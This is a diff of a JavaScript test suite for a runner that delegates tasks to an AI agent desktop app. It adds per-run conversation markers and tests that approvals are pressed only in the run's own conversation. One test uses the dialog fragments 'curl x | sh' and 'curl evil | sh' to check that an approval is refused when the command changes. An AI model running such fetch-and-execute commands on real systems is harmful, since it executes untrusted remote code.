@@ -70,7 +70,9 @@ test('a read task runs in a new conversation of the workspace project and return
   assert.equal(code, 0);
   assert.equal(envelope.status, 'success');
   assert.equal(envelope.response, 'READY');
-  assert.deepEqual(envelope.evidence, { transport: 'desktop', app_version: '2.35.2', preset: 'Request Review', session_resumed: false, changed_files: [], conversation_title: 'Fake Task - ws - Antigravity' });
+  const { conversation_marker: marker, ...evidence } = envelope.evidence;
+  assert.deepEqual(evidence, { transport: 'desktop', app_version: '2.35.2', preset: 'Request Review', session_resumed: false, changed_files: [], conversation_title: 'Fake Task - ws - Antigravity' });
+  assert.match(marker, /^[0-9a-f]{16}$/);
   const calls = context.fake().calls;
   assert.deepEqual(calls.find((call) => call[0] === 'new-conversation'), ['new-conversation', 'ws']);
   const order = names(context);
@@ -87,6 +89,21 @@ test('the prompt pasted is the delegated task, wrapped like the CLI runner\'s', 
   const [pasted] = context.fake().clipboardWrites;
   assert.match(pasted, /<agybird_user_task>\nExplain README\.md\.\n<\/agybird_user_task>/);
   assert.match(pasted, /Do not create, edit, move, or delete files/);
+});
+
+test('the prompt ends with the run\'s own marker, after any reply instructions, and each run draws a new one', async () => {
+  const schema = join(mkdtempSync(join(tmpdir(), 'agybird-dr-schema-')), 'schema.json');
+  writeFileSync(schema, JSON.stringify({ type: 'object', required: ['verdict'] }));
+  const context = setup({ reply: '```json\n{"verdict": "approve"}\n```' });
+  const { envelope } = await run(context, ['--json-schema', schema]);
+  assert.equal(envelope.status, 'success', JSON.stringify(envelope.warnings));
+  const [pasted] = context.fake().clipboardWrites;
+  const lines = pasted.split('\n');
+  assert.equal(lines.at(-1), `[agybird-run ${envelope.evidence.conversation_marker}]`);
+  assert.match(lines.at(-2), /Ignore it/);
+  assert.ok(pasted.indexOf('JSON schema') < pasted.indexOf('[agybird-run '), 'the reply contract comes before the marker');
+  const again = setup();
+  assert.notEqual((await run(again)).envelope.evidence.conversation_marker, envelope.evidence.conversation_marker);
 });
 
 test('preflight blocks with a specific reason and leaves no lock', async () => {
@@ -239,7 +256,7 @@ test('a bridge failure after Send presses Stop in the run\'s conversation before
   const { envelope } = await run(context);
   assert.equal(envelope.status, 'error');
   assert.equal(context.fake().stopped, true);
-  assert.deepEqual(context.fake().calls.find((call) => call[0] === 'stop'), ['stop', TITLE]);
+  assert.deepEqual(context.fake().calls.find((call) => call[0] === 'stop'), ['stop', TITLE, envelope.evidence.conversation_marker]);
   assertCleanedUp(context);
 });
 
@@ -293,6 +310,9 @@ test('with --json-schema the last fenced JSON block of the reply is the structur
 
 const DIALOG = { question: 'Allow list directory contents?', options: ['1 Yes, allow this time', "2 Yes, and always allow 'ls' in this conversation", "3 Yes, and always allow 'ls'", '4 No (tell the agent what to do instead)'] };
 const TITLE = 'Fake Task - ws - Antigravity';
+// The marker of the run that asked, and its message as the app shows it.
+const NONCE = '0123456789abcdef';
+const OWN = `Go on.\n[agybird-run ${NONCE}]`;
 
 test('read mode declines a permission prompt when the run already changed the working tree', async () => {
   const context = setup();
@@ -371,12 +391,35 @@ test('a conversation the user opens while the app names the run\'s is never adop
   assert.equal(context.fake().stopped, undefined);
 });
 
+test('a new conversation the user creates and the app titles during the naming wait is never adopted', async () => {
+  // Rival Chat is not listed before Send, is listed after it and is what the app shows.
+  const context = setup({ rivalDuringNaming: 'Rival Chat', runningPolls: 3, reply: 'the rival conversation\'s reply' });
+  const { envelope } = await run(context);
+  assert.equal(envelope.status, 'error');
+  assert.equal(envelope.response, null);
+  assert.equal(envelope.evidence.conversation_title, undefined);
+  for (const command of ['copy-reply', 'answer', 'stop']) assert.ok(!names(context).includes(command), command);
+  assert.equal(context.fake().stopped, undefined);
+});
+
+test('a conversation shown under the run\'s title without the run\'s own message is never read or pressed', async () => {
+  // After the second poll the app shows a namesake conversation: same title, another message.
+  const context = setup({ namesakeAfter: 2, runningPolls: 6, reply: 'the namesake\'s reply' });
+  const { envelope } = await run(context);
+  assert.equal(envelope.status, 'error');
+  assert.equal(envelope.response, null);
+  for (const command of ['copy-reply', 'answer', 'stop']) assert.ok(!names(context).includes(command), command);
+  assert.equal(context.fake().stopped, undefined);
+});
+
 test('the conversation title is taken from the Send call, so a late title is never adopted', async () => {
   const late = setup({ untitledPolls: 2, runningPolls: 3 });
   const { envelope } = await run(late);
   assert.equal(envelope.status, 'error');
   assert.ok(!names(late).includes('copy-reply'));
-  assert.deepEqual(late.fake().calls.find((call) => call[0] === 'send'), ['send', 'Antigravity', 'ws']);
+  const send = late.fake().calls.find((call) => call[0] === 'send');
+  assert.deepEqual(send.slice(0, 3), ['send', 'Antigravity', 'ws']);
+  assert.match(send[3], /^[0-9a-f]{16}$/);
 });
 
 test('paste and send are refused once the app no longer shows the new conversation', async () => {
@@ -393,18 +436,18 @@ test('a successful run names the conversation it read', async () => {
 });
 
 test('a resumed run waits for the new turn instead of returning the reply already on screen', async () => {
-  const context = setup({ sent: true, project: 'ws', dialog: DIALOG, replyBeforeDialog: 'checking the folder', lag: 1, runningPolls: 2, reply: 'final answer' });
-  const { envelope } = await run(context, ['--resume-dialog', DIALOG.question, '--resume-title', TITLE]);
+  const context = setup({ sent: true, project: 'ws', message: OWN, dialog: DIALOG, replyBeforeDialog: 'checking the folder', lag: 1, runningPolls: 2, reply: 'final answer' });
+  const { envelope } = await run(context, ['--resume-dialog', DIALOG.question, '--resume-title', TITLE, '--resume-marker', NONCE]);
   assert.equal(envelope.status, 'success', JSON.stringify(envelope.warnings));
   assert.equal(envelope.response, 'final answer');
 });
 
 test('a resumed run answers nothing when the app shows another conversation or another option 1', async () => {
-  const other = setup({ sent: true, project: 'ws', dialog: DIALOG, title: 'Other Chat - ws - Antigravity' });
-  assert.equal((await run(other, ['--resume-dialog', DIALOG.question, '--resume-title', TITLE])).envelope.status, 'error');
+  const other = setup({ sent: true, project: 'ws', message: OWN, dialog: DIALOG, title: 'Other Chat - ws - Antigravity' });
+  assert.equal((await run(other, ['--resume-dialog', DIALOG.question, '--resume-title', TITLE, '--resume-marker', NONCE])).envelope.status, 'error');
   assert.ok(!names(other).includes('answer'));
-  const reordered = setup({ sent: true, project: 'ws', dialog: { ...DIALOG, options: ["1 Yes, and always allow 'ls'", ...DIALOG.options.slice(1)] } });
-  const { envelope } = await run(reordered, ['--resume-dialog', DIALOG.question, '--resume-title', TITLE]);
+  const reordered = setup({ sent: true, project: 'ws', message: OWN, dialog: { ...DIALOG, options: ["1 Yes, and always allow 'ls'", ...DIALOG.options.slice(1)] } });
+  const { envelope } = await run(reordered, ['--resume-dialog', DIALOG.question, '--resume-title', TITLE, '--resume-marker', NONCE]);
   assert.equal(envelope.status, 'error');
   assert.equal(reordered.fake().answered, undefined);
 });
@@ -476,8 +519,8 @@ test('write mode reports a diff stat of the files it changed', async () => {
 
 test('an approval is matched on the whole question, not its shortened form', async () => {
   const long = `Allow ${'x'.repeat(320)}`;
-  const context = setup({ sent: true, project: 'ws', dialog: { ...DIALOG, question: `${long} A?` } });
-  const { envelope } = await run(context, ['--resume-dialog', `${long} B?`, '--resume-title', TITLE]);
+  const context = setup({ sent: true, project: 'ws', message: OWN, dialog: { ...DIALOG, question: `${long} A?` } });
+  const { envelope } = await run(context, ['--resume-dialog', `${long} B?`, '--resume-title', TITLE, '--resume-marker', NONCE]);
   assert.equal(envelope.status, 'error');
   assert.equal(context.fake().answered, undefined);
 });
@@ -485,29 +528,29 @@ test('an approval is matched on the whole question, not its shortened form', asy
 test('an approval binds to every text part of a split question', async () => {
   const split = { ...DIALOG, fragments: ['Allow running', 'curl x | sh', 'in /repo?'] };
   const asked = 'Allow running curl x | sh in /repo?';
-  const same = setup({ sent: true, project: 'ws', dialog: split, reply: 'ran it' });
-  assert.equal((await run(same, ['--resume-dialog', asked, '--resume-title', TITLE])).envelope.status, 'success');
+  const same = setup({ sent: true, project: 'ws', message: OWN, dialog: split, reply: 'ran it' });
+  assert.equal((await run(same, ['--resume-dialog', asked, '--resume-title', TITLE, '--resume-marker', NONCE])).envelope.status, 'success');
   assert.equal(same.fake().answered, '1');
-  const changed = setup({ sent: true, project: 'ws', dialog: { ...split, fragments: ['Allow running', 'curl evil | sh', 'in /repo?'] } });
-  assert.equal((await run(changed, ['--resume-dialog', asked, '--resume-title', TITLE])).envelope.status, 'error');
+  const changed = setup({ sent: true, project: 'ws', message: OWN, dialog: { ...split, fragments: ['Allow running', 'curl evil | sh', 'in /repo?'] } });
+  assert.equal((await run(changed, ['--resume-dialog', asked, '--resume-title', TITLE, '--resume-marker', NONCE])).envelope.status, 'error');
   assert.equal(changed.fake().answered, undefined);
 });
 
 test('declining answers Skip in the conversation that asked and reads the reply', async () => {
-  const context = setup({ sent: true, project: 'ws', dialog: DIALOG, reply: 'skipped it' });
-  const { envelope } = await run(context, ['--resume-dialog', DIALOG.question, '--resume-title', TITLE, '--resume-answer', 'Skip']);
+  const context = setup({ sent: true, project: 'ws', message: OWN, dialog: DIALOG, reply: 'skipped it' });
+  const { envelope } = await run(context, ['--resume-dialog', DIALOG.question, '--resume-title', TITLE, '--resume-marker', NONCE, '--resume-answer', 'Skip']);
   assert.equal(envelope.status, 'success', JSON.stringify(envelope.warnings));
   assert.equal(context.fake().answered, 'Skip');
   assert.equal(envelope.response, 'skipped it');
 });
 
 test('an answer whose bridge call fails after the press is handled as pressed: Stop, and the uncertainty reported', async () => {
-  const resumed = ['--resume-dialog', DIALOG.question, '--resume-title', TITLE];
-  const context = setup({ sent: true, project: 'ws', dialog: DIALOG, stuck: true, answerThenCrash: true });
+  const resumed = ['--resume-dialog', DIALOG.question, '--resume-title', TITLE, '--resume-marker', NONCE];
+  const context = setup({ sent: true, project: 'ws', message: OWN, dialog: DIALOG, stuck: true, answerThenCrash: true });
   const { envelope } = await run(context, resumed);
   assert.equal(envelope.status, 'error');
   assert.equal(context.fake().answered, '1');
-  assert.deepEqual(context.fake().calls.find((call) => call[0] === 'stop'), ['stop', TITLE]);
+  assert.deepEqual(context.fake().calls.find((call) => call[0] === 'stop'), ['stop', TITLE, NONCE]);
   assert.equal(context.fake().stopped, true);
   // Spent, since it may have been pressed, and said to be uncertain.
   assert.equal(envelope.evidence.answered, '1');
@@ -515,7 +558,7 @@ test('an answer whose bridge call fails after the press is handled as pressed: S
   assert.ok(envelope.warnings.some((warning) => /may have been pressed/.test(warning)), envelope.warnings.join(' | '));
   assert.equal(existsSync(lockFile(context)), false);
 
-  const unstoppable = setup({ sent: true, project: 'ws', dialog: DIALOG, stuck: true, answerThenCrash: true, stopFails: true });
+  const unstoppable = setup({ sent: true, project: 'ws', message: OWN, dialog: DIALOG, stuck: true, answerThenCrash: true, stopFails: true });
   const kept = await run(unstoppable, resumed);
   assert.ok(kept.envelope.warnings.some((warning) => /may still be going/.test(warning)));
   assert.deepEqual(JSON.parse(readFileSync(lockFile(unstoppable), 'utf8')).conversation, TITLE);
@@ -523,9 +566,9 @@ test('an answer whose bridge call fails after the press is handled as pressed: S
 });
 
 test('a resumed run records its pressed answer at once, before it waits for the turn', { skip: process.platform === 'win32' }, async () => {
-  const context = setup({ sent: true, project: 'ws', dialog: DIALOG, stuck: true });
+  const context = setup({ sent: true, project: 'ws', message: OWN, dialog: DIALOG, stuck: true });
   const ack = join(mkdtempSync(join(tmpdir(), 'agybird-dr-ack-')), 'job.answered-0');
-  const child = spawn(process.execPath, [RUNNER, '--category', 'code', '--cwd', context.cwd, '--resume-dialog', DIALOG.question, '--resume-title', TITLE, '--resume-ack', ack], { env: context.env, stdio: ['pipe', 'ignore', 'ignore'] });
+  const child = spawn(process.execPath, [RUNNER, '--category', 'code', '--cwd', context.cwd, '--resume-dialog', DIALOG.question, '--resume-title', TITLE, '--resume-marker', NONCE, '--resume-ack', ack], { env: context.env, stdio: ['pipe', 'ignore', 'ignore'] });
   child.stdin.end('Go on.');
   const exited = new Promise((resolve) => child.on('close', resolve));
   for (let waited = 0; !existsSync(ack); waited += 20) {
@@ -539,9 +582,9 @@ test('a resumed run records its pressed answer at once, before it waits for the 
 });
 
 test('the answer is recorded as spent before its step starts, so a kill during it leaves it spent', { skip: process.platform === 'win32' }, async () => {
-  const context = setup({ sent: true, project: 'ws', dialog: DIALOG, stuck: true, delays: { answer: 3_000 } });
+  const context = setup({ sent: true, project: 'ws', message: OWN, dialog: DIALOG, stuck: true, delays: { answer: 3_000 } });
   const ack = join(mkdtempSync(join(tmpdir(), 'agybird-dr-ack-')), 'job.answered-0');
-  const child = spawn(process.execPath, [RUNNER, '--category', 'code', '--cwd', context.cwd, '--resume-dialog', DIALOG.question, '--resume-title', TITLE, '--resume-ack', ack], { env: context.env, stdio: ['pipe', 'ignore', 'ignore'] });
+  const child = spawn(process.execPath, [RUNNER, '--category', 'code', '--cwd', context.cwd, '--resume-dialog', DIALOG.question, '--resume-title', TITLE, '--resume-marker', NONCE, '--resume-ack', ack], { env: context.env, stdio: ['pipe', 'ignore', 'ignore'] });
   child.stdin.end('Go on.');
   const exited = new Promise((resolve) => child.on('close', resolve));
   let recorded;
@@ -557,20 +600,35 @@ test('the answer is recorded as spent before its step starts, so a kill during i
   assert.equal(existsSync(ack), true);
 });
 
+test('an approval presses nothing in a conversation that has the asking title but not the asking run\'s message', async () => {
+  const context = setup({ sent: true, project: 'ws', message: 'Another task of the user.', dialog: DIALOG });
+  const ack = join(mkdtempSync(join(tmpdir(), 'agybird-dr-ack-')), 'job.answered-0');
+  const { envelope } = await run(context, ['--resume-dialog', DIALOG.question, '--resume-title', TITLE, '--resume-marker', NONCE, '--resume-ack', ack]);
+  assert.equal(envelope.status, 'error');
+  assert.ok(envelope.warnings.some((warning) => /own message/.test(warning)), envelope.warnings.join(' | '));
+  assert.ok(!names(context).includes('answer'));
+  assert.equal(context.fake().answered, undefined);
+  assert.equal(existsSync(ack), false, 'still approvable');
+  // A resumed run needs the asking run's marker.
+  const unmarked = setup({ sent: true, project: 'ws', message: OWN, dialog: DIALOG });
+  assert.equal((await run(unmarked, ['--resume-dialog', DIALOG.question, '--resume-title', TITLE])).envelope.status, 'error');
+  assert.equal(unmarked.fake().calls, undefined);
+});
+
 test('an answer that already has a record is never pressed again', async () => {
-  const context = setup({ sent: true, project: 'ws', dialog: DIALOG });
+  const context = setup({ sent: true, project: 'ws', message: OWN, dialog: DIALOG });
   const ack = join(mkdtempSync(join(tmpdir(), 'agybird-dr-ack-')), 'job.answered-0');
   writeFileSync(ack, '1\n');
-  const { envelope } = await run(context, ['--resume-dialog', DIALOG.question, '--resume-title', TITLE, '--resume-ack', ack]);
+  const { envelope } = await run(context, ['--resume-dialog', DIALOG.question, '--resume-title', TITLE, '--resume-marker', NONCE, '--resume-ack', ack]);
   assert.equal(envelope.status, 'error');
   assert.ok(!names(context).includes('answer'));
   assert.equal(readFileSync(ack, 'utf8'), '1\n');
 });
 
 test('an answer refused before any press is not spent and stops nothing', async () => {
-  const context = setup({ sent: true, project: 'ws', dialog: { ...DIALOG, options: ["1 Yes, and always allow 'ls'", ...DIALOG.options.slice(1)] } });
+  const context = setup({ sent: true, project: 'ws', message: OWN, dialog: { ...DIALOG, options: ["1 Yes, and always allow 'ls'", ...DIALOG.options.slice(1)] } });
   const ack = join(mkdtempSync(join(tmpdir(), 'agybird-dr-ack-')), 'job.answered-0');
-  const { envelope } = await run(context, ['--resume-dialog', DIALOG.question, '--resume-title', TITLE, '--resume-ack', ack]);
+  const { envelope } = await run(context, ['--resume-dialog', DIALOG.question, '--resume-title', TITLE, '--resume-marker', NONCE, '--resume-ack', ack]);
   assert.equal(envelope.status, 'error');
   assert.equal(envelope.evidence.answered, undefined);
   assert.equal(existsSync(ack), false, 'the record of an answer refused before any press is withdrawn');
@@ -579,10 +637,10 @@ test('an answer refused before any press is not spent and stops nothing', async 
 });
 
 // A lock kept for an app task by a run that is gone (its pid is not running).
-const appLock = (context, expiresAt) => writeFileSync(lockFile(context), JSON.stringify({ pid: 999999999, expiresAt, app: true, conversation: TITLE }));
+const appLock = (context, expiresAt) => writeFileSync(lockFile(context), JSON.stringify({ pid: 999999999, expiresAt, app: true, conversation: TITLE, marker: NONCE }));
 
 test('a kept app lock past its time still refuses a run while its conversation shows a run', async () => {
-  const context = setup({ earlier: { title: TITLE, running: true } });
+  const context = setup({ earlier: { title: TITLE, running: true, message: OWN } });
   appLock(context, Date.now() - 1);
   const { envelope } = await run(context);
   assert.equal(envelope.evidence.blocked_reason, 'locked');
@@ -592,7 +650,7 @@ test('a kept app lock past its time still refuses a run while its conversation s
 });
 
 test('a kept app lock is released once the app shows its conversation with no run', async () => {
-  const context = setup({ earlier: { title: TITLE, running: false } });
+  const context = setup({ earlier: { title: TITLE, running: false, message: OWN } });
   appLock(context, Date.now() + 60 * 60_000);
   const { envelope } = await run(context);
   assert.equal(envelope.status, 'success', JSON.stringify(envelope.warnings));
@@ -601,6 +659,10 @@ test('a kept app lock is released once the app shows its conversation with no ru
   const other = setup({ earlier: { title: 'Other Chat - ws - Antigravity', running: false } });
   appLock(other, Date.now() - 1);
   assert.equal((await run(other)).envelope.evidence.blocked_reason, 'locked');
+  // Nor is a namesake: the lock's title, without its run's own message.
+  const namesake = setup({ earlier: { title: TITLE, running: false, message: 'Another task of the user.' } });
+  appLock(namesake, Date.now() - 1);
+  assert.equal((await run(namesake)).envelope.evidence.blocked_reason, 'locked');
 });
 
 test('a stalled Stop finds the app lock already kept, and cleanup ends on its own within the grace', { skip: process.platform === 'win32' }, async () => {
